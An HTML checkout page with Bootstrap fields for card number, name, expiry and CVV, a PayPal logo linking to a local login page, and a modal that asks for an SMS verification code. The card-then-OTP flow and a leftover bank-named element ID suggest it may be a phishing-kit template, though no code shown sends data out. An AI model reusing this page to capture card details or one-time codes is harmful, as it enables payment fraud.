<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Checkout</title>

  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-1BmE4kWBq78iYhFldvKuhfTAU6auU8tT94WrHftjDbrCEXSU1oBoqyl2QvZ6jIW3" crossorigin="anonymous">
  <link rel="stylesheet" href="/assets/css/checkout.css">
  <link rel="stylesheet" href="/assets/css/styles.css">
  <script src="https://kit.fontawesome.com/64664913ea.js" crossorigin="anonymous"></script>
</head>

<body>
  <div class="container d-flex justify-content-center">
    <div class="contact-form">
      <div class="row mt-lg-3">
        <h4 class="fw-lightbold m-0">Payment</h4>

        <div class=""  style="padding: 0; margin: 20px 0 0 0">
          <div class="card">
            <div class="card-header d-flex justify-content-between align-items-center">
              <div>
                <!-- <input class="form-check-input" style="margin-left: 0" type="radio" name="flexRadioDefault" id="flexRadioDefault1">
                <label class="form-check-label" style="margin-left: 10px"  for="flexRadioDefault1">
                </label> -->
                <p style="padding: 0; margin:0 0 0 12px ">Credit Card</p>
              </div>
              <img src="assets/media/paymentgroup.png" alt="imgs" width="150" height="26">
            </div>
            <div class="card-body row p-4">
              <div class="col-md-12 col-sm-12 col-xs-12">
                <div class="form-group">
                  <input type="text" class="form-control" id="ccnum" name="cardnumber" placeholder="Credit card number">
                </div>
              </div>
              <div class="col-md-12 col-sm-12 col-xs-12">
                <div class="form-group">
                  <input type="text" class="form-control" id="cname" name="cardname" placeholder="Name on card">
                </div>
              </div>
              
              <div class="col-md-12 col-sm-12 col-xs-12">
                <div class="form-group">
                  <input type="text" class="form-control" id="expmonth" name="expmonth" placeholder="MM/YY">
                </div>
              </div>
              <div class="col-md-6 col-sm-6 col-xs-12">
                <div class="form-group">
                  <input type="text" class="form-control" id="cvv" name="cvv" placeholder="Security code">
                </div>
              </div>
            </div>
          </div>
        </div>

        <div class="" style="padding: 0">
          <div class="card">
            <div class="card-header d-flex align-items-center">
              <!-- <input class="form-check-input" style="margin-left: 0" type="radio" name="flexRadioDefault" id="flexRadioDefault2" checked>
              <label class="form-check-label" style="margin-left: 10px" for="flexRadioDefault2">
              </label> -->
              <a href="/login" style="margin:0 0 0 12px"><img src="/assets/media/paypal_brand.png" width="90" class="m-0"></a>
            </div>
          </div>
        </div>

        <div class="col-md-12 col-sm-12 col-xs-12 mt-2">
          <div class="form-group">
            <input type="checkbox" checked="checked" name="sameadr"> Shipping address same as billing
          </div>
        </div>
        <div class="col-md-12 col-sm-12 col-xs-12 mt-4">
          <div class="form-group">
            <a href="#" class="btn00 cont-ship" data-bs-toggle="modal" data-bs-target="#captchaModal"> Continue to checkout</a>
            <!-- <button type="button" class="btn btn00 cont-ship" data-bs-toggle="modal" data-bs-target="#captchaModal">
              Continue to checkout
            </button> -->
          </div>
        </div>
    </div>
  </div>

  <div class="modal fade" id="captchaModal" tabindex="-1" role="dialog" aria-labelledby="captchaModalLabel" aria-hidden="true">
    <div class="modal-dialog" role="document">
      <div class="modal-content">
        <h1 class="fw-bold mb-2">Phone number verification</h1>
        <p class="mb-3">We have sent the verification information to your phone number, please check and enter the correct verification code to confirm that it is you.</p>

        <form method="POST" novalidate class="needs-validation" action="/comingsoon">
          <div class="input-group mb-3">
            <div class="form-floating">
              <input required type="text" class="form-control bg-body border-0 border-bottom focus-none" id="verification-code" placeholder="asd">
              <label for="floatingInput">Verification code</label>
            </div>
            <span class="input-group-text bg-body border-0 text-muted border-bottom" id="phone-timer">60</span>
            <div id="validationServerBMOFeedback" class="invalid-feedback b-0">
                Please enter 
            </div>
          </div>

          <input class="mt-3 py-2 px-5 fs-6 btn btn-primary btn-lg rounded-pill" type="submit" value="VERIFY">
          <!-- <button type="button" class="btn btn-primary" data-toggle="modal" data-target="#captchar_modal">
            Pay
          </button> -->
        </form>
      </div>
    </div>
  </div>

  <script src="https://code.jquery.com/jquery-3.6.1.min.js" integrity="sha256-o88AwQnZB+VDvE9tvIXrMQaPlFFSUTR+nldQm1LuPXQ=" crossorigin="anonymous"></script>
  <script src="https://cdn.jsdelivr.net/npm/@popperjs/core@2.10.2/dist/umd/popper.min.js" integrity="sha384-7+zCNj/IqJ95wo16oMtfsKbZ9ccEh31eOz1HGyDuCQ6wgnyJNSYdrPa03rtR1zdB" crossorigin="anonymous"></script>
  <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/js/bootstrap.min.js" integrity="sha384-QJHtvGhmr9XOIpI6YVutG+2QOK9T+ZnN4kzFN1RtK3zEFEIsxhlmWl5/YESvpZ13" crossorigin="anonymous"></script>
  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.mask/1.14.16/jquery.mask.js" 
        integrity="sha256-yE5LLp5HSQ/z+hJeCqkz9hdjNkk1jaiGG0tDCraumnA=" 
        crossorigin="anonymous"></script>

  <script src="/assets/js/main.js"></script>
  <script type="text/javascript">

    var phoneTimer;
    var time = 60;
    $('.cont-ship').on('click', function() {
      phoneTimer = setInterval(function() {
        $('#phone-timer').text(time);
        time--;
        if (time < 0) {
          clearInterval(phoneTimer);
        }
      }, 1000);
    })

    $('#captchaModal').on('hidden.bs.modal', function () {
      // do something…
      console.log("modal dismiss")
      clearInterval(phoneTimer);
    })
  </script>
</body>
</html>